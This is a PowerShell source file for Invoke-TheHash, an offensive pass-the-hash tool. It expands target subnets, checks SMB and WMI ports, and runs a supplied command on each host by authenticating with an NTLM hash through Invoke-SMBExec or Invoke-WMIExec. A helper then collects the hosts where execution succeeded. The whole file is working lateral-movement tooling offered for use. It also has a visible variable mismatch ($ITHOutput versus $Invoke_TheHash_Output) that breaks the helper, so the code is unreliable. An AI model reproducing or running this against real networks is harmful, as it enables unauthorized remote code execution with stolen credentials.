function Invoke-TheHash
{

[CmdletBinding()]
param
(
    [parameter(Mandatory=$true)][Array]$Targets,
    [parameter(Mandatory=$false)][Array]$TargetsExclude,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(Mandatory=$true)][ValidateSet("SMBExec","WMIExec")][String]$Type,
    [parameter(Mandatory=$false)][Int]$PortCheckTimeout = 100,
    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$PortCheckDisable,
    [parameter(Mandatory=$false)][Int]$Sleep,
    [parameter(Mandatory=$false)][Switch]$SMB1
)

$target_list = New-Object System.Collections.ArrayList
$target_list_singles = New-Object System.Collections.ArrayList
$target_list_subnets = New-Object System.Collections.ArrayList

if($Type -eq 'WMIExec')
{
    $Sleep = 10
}
else
{
    $Sleep = 150
}


foreach($target in $Targets)
{

    if($target.contains("/"))
    {
        $target_split = $target.split("/")[0]
        [uint32]$subnet_mask_split = $target.split("/")[1]

        $target_address = [System.Net.IPAddress]::Parse($target_split)

        if($subnet_mask_split -ge $target_address.GetAddressBytes().Length * 8)
        {
            throw "Subnet mask is not valid"
        }

        $target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))

        $target_start_address = $target_address.GetAddressBytes()
        [array]::Reverse($target_start_address)

        $target_start_address = [System.BitConverter]::ToUInt32($target_start_address,0)
        [uint32]$target_subnet_mask_start = ([System.math]::Pow(2, $subnet_mask_split)-1) * ([System.Math]::Pow(2,(32 - $subnet_mask_split)))
        $target_start_address = $target_start_address -band $target_subnet_mask_start

        $target_start_address = [System.BitConverter]::GetBytes($target_start_address)[0..3]
        [array]::Reverse($target_start_address)

        $target_address = [System.Net.IPAddress] [byte[]] $target_start_address

        $target_list_subnets.Add($target_address.IPAddressToString) > $null

        for ($i=0; $i -lt $target_count-1; $i++)
        {
            $target_next =  $target_address.GetAddressBytes()
            [array]::Reverse($target_next)
            $target_next =  [System.BitConverter]::ToUInt32($target_next,0)
            $target_next ++
            $target_next = [System.BitConverter]::GetBytes($target_next)[0..3]
            [array]::Reverse($target_next)

            $target_address = [System.Net.IPAddress] [byte[]] $target_next
            $target_list_subnets.Add($target_address.IPAddressToString) > $null
        }

        $target_list_subnets.RemoveAt(0)
        $target_list_subnets.RemoveAt($target_list_subnets.Count - 1)

    }
    else
    {
        $target_list_singles.Add($target) > $null
    }

}

$target_list.AddRange($target_list_singles)
$target_list.AddRange($target_list_subnets)

foreach($target in $TargetsExclude)
{
    $target_list.Remove("$Target")
}

foreach($target in $target_list)
{

    if($type -eq 'WMIExec')
    {

        if(!$PortCheckDisable)
        {
            $WMI_port_test = New-Object System.Net.Sockets.TCPClient
            $WMI_port_test_result = $WMI_port_test.BeginConnect($target,"135",$null,$null)
            $WMI_port_test_success = $WMI_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
            $WMI_port_test.Close()
        }

        if($WMI_port_test_success -or $PortCheckDisable)
        {
            Invoke-WMIExec -username $Username -domain $Domain -hash $Hash -command $Command -target $target -sleep $Sleep
        }

    }
    elseif($Type -eq 'SMBExec')
    {

        if(!$PortCheckDisable)
        {
            $SMB_port_test = New-Object System.Net.Sockets.TCPClient
            $SMB_port_test_result = $SMB_port_test.BeginConnect($target,"445",$null,$null)
            $SMB_port_test_success = $SMB_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
            $SMB_port_test.Close()
        }

        if($SMB_port_test_success -or $PortCheckDisable)
        {
            Invoke-SMBExec -username $Username -domain $Domain -hash $Hash -command $Command -CommandCOMSPEC $CommandCOMSPEC -Service $Service -target $target -smb1:$smb1 -sleep $Sleep
        }
        
    }
     
}

}

function ConvertTo-TargetList
{


[CmdletBinding()]
param ([parameter(Mandatory=$true)][Array]$Invoke_TheHash_Output)

$target_list = New-Object System.Collections.ArrayList

foreach($target in $ITHOutput)
{
        
    if($target -like "* on *" -and $target -notlike "* denied *" -and $target -notlike "* failed *" -and $target -notlike "* is not *")
    {
        $target_index = $target.IndexOf(" on ")
        $target_index += 4
        $target = $target.SubString($target_index,($target.Length - $target_index))
        $target_list.Add($target) > $null
    }

}

return $target_list
}
